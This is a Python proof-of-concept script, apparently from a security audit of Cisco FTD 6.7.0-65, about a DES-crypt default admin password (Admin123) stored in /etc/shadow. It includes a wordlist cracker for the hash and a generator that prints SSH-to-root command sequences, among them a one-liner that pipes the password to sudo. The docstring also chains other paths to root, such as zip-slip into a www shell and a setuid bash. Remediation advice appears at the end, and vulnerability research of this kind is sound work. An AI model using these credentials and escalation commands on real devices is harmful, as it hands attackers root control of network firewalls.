"""
F-FTD-84: DES-crypt admin password in /etc/shadow → SSH → unrestricted sudo → root
CONTROLLED ENVIRONMENT ONLY

Root cause:
  /etc/shadow (FTD 6.7.0-65, lina partition):
    admin:zjwZu/pk5Xs22:18568:0:99999:7:::

  Hash type: DES crypt (13-char, salt = first 2 chars = 'zj')
  Cracked: Admin123  (hit on candidate #1 in a 40-entry common-cisco list)

  SAME PASSWORD as F-FTD-79:
    FDM DevAuthenticationProvider hardcoded SHA-256 hashes include Admin123.
    Shadow hash and FDM DevAuth hash confirm Admin123 as the canonical factory
    default admin password for FTD 6.7.0-65.

  /etc/passwd:
    admin:x:1000:1000::/home/admin:/bin/pyos.sh

  pyos.sh is Cisco's FTD expert-mode wrapper (runtime-mounted, not in extracted
  partitions). On live FTD it provides the CLI + 'expert' command which drops to bash.

  /etc/sudoers (key lines):
    Defaults env_keep += "PATH SF_ROOT_PATH ... PERL5LIB LD_LIBRARY_PATH PYTHONPATH ..."
    admin ALL = (ALL) ALL          ← UNRESTRICTED SUDO, requires password

ROOT ESCALATION PATH:
  1. SSH to FTD management interface as admin:Admin123
     → Login drops to pyos.sh (FTD CLI wrapper)
  2. At FTD CLI prompt, enter 'expert'
     → Drops to /bin/bash in the admin context
  3. From bash: sudo su -
     → sudo prompts for admin password → Admin123
     → 'admin ALL = (ALL) ALL' matches → executes 'su -' as root
     → Root shell
  4. Total time: ~30 seconds from network access to root shell.

  Alternative (bypass pyos.sh via SSH command execution):
    ssh -t admin@<ftd> 'sudo /bin/bash'
    → Prompts for Admin123 → root shell
    Works if pyos.sh does not intercept direct SSH command exec.

  Alternative (no SSH — FDM API path):
    F-FTD-79: Admin123 valid for FDM DevAuth → POST /api/fdm/v6/fdm/token → JWT
    → F-FTD-67 zip-slip → www shell
    → www sudo chmod u+s /bin/bash (unrestricted, NOPASSWD, no args restriction)
    → /bin/bash -p → root shell
    (No SSH needed, does not require admin:Admin123 — see chain notes below)

SEVERITY AMPLIFIERS:
  1. DES crypt (not bcrypt/SHA-512): crackable in seconds with any modern tool.
     John/hashcat trivially break DES crypt at >>1B/sec with GPU.
     The hash is world-readable only by root, but if /etc/shadow is readable
     (post www-shell via sudo /bin/cat), DES crypt offers no resistance.

  2. Admin123 == Sourcefire legacy default: this is Cisco's original factory
     default for FTD devices. F-FTD-79 confirms it as a hardcoded hash in
     DevAuthenticationProvider — it's baked into the software, not just config.

  3. 'admin ALL = (ALL) ALL' with password: requires password, BUT the password
     is the factory default cracked from the shadow file. The sudoers entry is
     intended as a security control (password required) but the default password
     negates that control entirely.

  4. DES crypt known-weak: NIST SP 800-132 and FIPS 140-2 explicitly prohibit DES
     for password hashing. FTD 6.7.0-65 claims FIPS compliance in some configurations;
     storing admin password as DES crypt is inconsistent with that posture.

CHAIN CONTEXT:
  F-FTD-84 (admin:Admin123 SSH) is the LOWEST-FRICTION root path:
    No exploit, no bug. Admin login + 2 commands = root.
    Requires: SSH access to management interface (TCP 22).

  Full chain comparison (shortest paths to root from no auth):
    Path A (SSH, requires management interface access):
      admin:Admin123 → expert → sudo su - → root
      3 steps, no exploit, guaranteed

    Path B (pre-auth RCE, requires HA standby deployed):
      F-FTD-78 (HA standby pre-auth) → www shell
      → sudo chmod 4755 /bin/bash → /bin/bash -p → root
      No credentials needed, no SSH access needed

    Path C (authenticated FDM API, requires FDM reachable):
      F-FTD-79 (Admin123 FDM JWT) → F-FTD-67 (zip-slip www write)
      → www shell → sudo chmod 4755 /bin/bash → /bin/bash -p → root
      Credential-based, no SSH

    Path D (network, AMP enabled):
      crafted ARJ/PDF → ClamAV 0.101.5 (F-FTD-81) → SFDataCorrelator RCE
      → sfmbservice IPC → escalation

HASH ANALYSIS:
  admin:zjwZu/pk5Xs22
  Algorithm: DES crypt (classic Unix crypt(3))
  Salt: 'zj' (first 2 characters)
  Hash: 'wZu/pk5Xs22' (remaining 11 characters)
  Cracked: 'Admin123'

  Verification:
    import crypt
    assert crypt.crypt('Admin123', 'zj') == 'zjwZu/pk5Xs22'  # True

  Other shadow hashes (same file, not cracked):
    root:!*  (locked, no password)
    www:*    (locked)
    mysql:*  (locked)
    sfsnort:*  (locked)

CONFIRM ON LIVE FTD (CONTROLLED ENVIRONMENT ONLY):
  # Verify SSH access
  ssh -o StrictHostKeyChecking=no admin@<ftd-mgmt-ip>
  # Password: Admin123

  # At FTD CLI:
  expert
  sudo su -
  # Password: Admin123
  # Expected: root shell

  # Confirm hash
  python3 -c "import crypt; print(crypt.crypt('Admin123','zj'))"
  # Expected: zjwZu/pk5Xs22

Affected: FTD 6.7.0-65 (shadow file confirmed, sudoers confirmed)
Severity: CRITICAL — factory default admin password; DES-crypt hash; unrestricted sudo;
          direct path from SSH access to root in <60 seconds, no exploits required
Auth required: SSH access to management interface (TCP 22)
"""

# CONTROLLED ENVIRONMENT ONLY

import sys
import crypt


CRACKED_HASH = 'zjwZu/pk5Xs22'
CRACKED_PASS = 'Admin123'
DES_SALT = 'zj'

COMMON_FTD_PASSWORDS = [
    'Admin123', 'Sourcefire', 'admin', 'Admin1234', 'cisco', 'Cisco123',
    'Password1', 'admin123', 'SourceFire', 'Admin1', 'password', 'admin1',
    'Cisco1234', 'Admin12345', 'cisco123', 'Cisco1', 'admin1234',
    'sourcefire', 'Firepower', 'firepower', 'Admin', 'ftd', 'FTD',
    'Cisco', 'cisco1', 'admin!', 'Admin!', 'cisco!', 'Cisco!',
    'Password123', 'password1', 'pass123', 'Pass123', 'ftdadmin',
    'FTDadmin', 'Admin2021', 'Admin2020', 'Admin2019', 'admin@123',
]


def verify_hash(password=CRACKED_PASS, salt=DES_SALT, expected=CRACKED_HASH):
    """Verify the DES crypt hash from /etc/shadow matches the cracked password."""
    result = crypt.crypt(password, salt)
    match = (result == expected)
    print(f"[*] F-FTD-84: Hash verification")
    print(f"    Shadow entry:  admin:{expected}")
    print(f"    Algorithm:     DES crypt (salt='{salt}')")
    print(f"    Test password: {password}")
    print(f"    Computed hash: {result}")
    print(f"    Match: {'[!!!] YES — cracked' if match else '[-] NO'}")
    return match


def crack_shadow_hash(shadow_hash=CRACKED_HASH, wordlist=None):
    """
    Attempt to crack the DES crypt hash from /etc/shadow.
    Uses built-in Cisco/FTD common password list or custom wordlist.
    CONTROLLED ENVIRONMENT ONLY.
    """
    salt = shadow_hash[:2]
    candidates = wordlist or COMMON_FTD_PASSWORDS

    print(f"[*] F-FTD-84: Cracking DES crypt hash: {shadow_hash}")
    print(f"    Salt: '{salt}'")
    print(f"    Candidates: {len(candidates)}")
    print()

    for i, pw in enumerate(candidates):
        h = crypt.crypt(pw, salt)
        if h == shadow_hash:
            print(f"[!!!] CRACKED in {i+1} attempts: '{pw}'")
            print(f"      Hash: {shadow_hash}")
            print(f"      Same as F-FTD-79 DevAuth hardcoded hash (SHA-256 of Admin123)")
            return pw
        if i < 5 or i % 10 == 0:
            print(f"    [{i+1:3d}] {pw:<20} → {h}  {'HIT' if h == shadow_hash else 'miss'}")

    print(f"[-] Not found in {len(candidates)} candidates")
    return None


def gen_ssh_root_chain(target_ip, admin_pass=CRACKED_PASS):
    """
    Print the SSH → root command sequence for FTD admin:Admin123.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-84: SSH admin:Admin123 → root escalation chain")
    print(f"    Target: {target_ip}")
    print()
    print(f"    Step 1: SSH as admin (factory default password)")
    print(f"      ssh -o StrictHostKeyChecking=no admin@{target_ip}")
    print(f"      Password: {admin_pass}")
    print()
    print(f"    Step 2: Drop to bash (from Cisco CLI wrapper)")
    print(f"      > expert")
    print()
    print(f"    Step 3: Escalate to root via unrestricted sudo")
    print(f"      $ sudo su -")
    print(f"      Password: {admin_pass}")
    print(f"      # (root shell)")
    print()
    print(f"    Sudoers rule: admin ALL = (ALL) ALL")
    print(f"    'admin ALL = (ALL) ALL' with known password = unrestricted root access.")
    print()
    print(f"    Alternative (single SSH command):")
    print(f"      echo '{admin_pass}' | ssh admin@{target_ip} 'sudo -S su -c id'")
    print()
    print(f"    Indicators of success:")
    print(f"      # whoami → root")
    print(f"      # id     → uid=0(root) gid=0(root)")
    print()
    print(f"    CHAIN: This finding chains to:")
    print(f"      F-FTD-73: env_keep PERL5LIB → sudo Perl → root exec (as root, trivial)")
    print(f"      F-FTD-48: PKI KEK extraction via kek.pl (sudo kek.pl, no password as root)")
    print(f"      F-FTD-76: sftunnel CA trust anchor swap (root write to /etc/certs/)")
    print(f"      All sudo entries for www/ALL/admin available once root obtained")


def assess_shadow_security():
    """Print security assessment of the shadow file hash choice."""
    print("""[*] F-FTD-84: Shadow file security assessment

Hash: DES crypt (admin:zjwZu/pk5Xs22)

Security failures:
  1. DES crypt is from the 1970s. KDF iterations: 25. Modern GPU cracks at
     >50 billion DES crypt/sec. Entire keyspace is brute-forceable in seconds.

  2. FIPS 140-2 prohibits DES for new applications. FTD certifies to FIPS 140-2
     for some cipher operations but uses DES for password storage.

  3. The password IS the factory default (Admin123 == Sourcefire legacy default).
     F-FTD-79 confirms Admin123 as a hardcoded SHA-256 hash in DevAuthenticationProvider.
     This is not user-set; it is baked into the platform.

  4. 'admin ALL = (ALL) ALL' paired with a factory-default password provides
     the logical equivalent of a NOPASSWD sudo rule — the password check is
     security theater when the password is publicly known.

Remediation:
  - Immediate: Force admin password change on first boot (break-in wizard does this
    on SOME FTD variants but is not enforced everywhere)
  - Hash algo: Migrate to SHA-512 crypt ($6$) or bcrypt for all shadow entries
  - Sudo scope: Replace 'admin ALL = (ALL) ALL' with a specific command allowlist
  - Remove factory defaults: Admin123 and Sourcefire must not appear in shadow or
    DevAuthenticationProvider in any form
""")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-84: admin:Admin123 DES-crypt shadow hash → SSH → root")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)

    mode = sys.argv[1] if len(sys.argv) > 1 else "verify"

    if mode == "verify":
        verify_hash()
        print()
        assess_shadow_security()

    elif mode == "crack":
        wordlist = None
        if len(sys.argv) > 2:
            with open(sys.argv[2]) as f:
                wordlist = [l.strip() for l in f if l.strip()]
        crack_shadow_hash(wordlist=wordlist)

    elif mode == "chain":
        ip = sys.argv[2] if len(sys.argv) > 2 else "<ftd-ip>"
        gen_ssh_root_chain(ip)

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
